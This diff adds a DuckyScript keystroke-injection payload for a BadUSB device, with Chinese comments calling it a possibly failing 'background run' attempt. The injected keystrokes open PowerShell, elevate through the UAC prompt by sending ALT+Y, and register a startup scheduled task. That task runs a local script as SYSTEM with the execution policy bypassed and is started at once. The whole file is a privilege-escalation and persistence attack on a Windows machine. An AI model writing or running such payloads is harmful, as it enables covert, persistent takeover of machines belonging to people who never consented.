@@ -1,0 +1,39 @@
+REM 疑似失败的后台运行（ps：还缺UAC弹出窗口点yes & 本质是专门创一个后台运行文件）
+
+REM 开启 PowerShell
+DELAY 500
+GUI r
+DELAY 500
+STRING powershell
+DELAY 500
+ENTER
+DELAY 1000
+
+REM 提升权限到管理员
+STRING Start-Process powershell -Verb runAs
+ENTER
+DELAY 2000
+ALT y
+DELAY 2000
+
+REM 输入并执行创建计划任务的 PowerShell 命令
+STRING $TaskName = "RunCScriptInBackground"
+ENTER
+DELAY 100
+STRING $TaskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File 'C:\Users\halfa\c.ps1'"
+ENTER
+DELAY 100
+STRING $TaskTrigger = New-ScheduledTaskTrigger -AtStartup
+ENTER
+DELAY 100
+STRING $TaskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
+ENTER
+DELAY 100
+STRING Register-ScheduledTask -TaskName $TaskName -Action $TaskAction -Trigger $TaskTrigger -Principal $TaskPrincipal
+ENTER
+DELAY 100
+STRING Start-ScheduledTask -TaskName $TaskName
+ENTER
+DELAY 100
+STRING exit
+ENTER
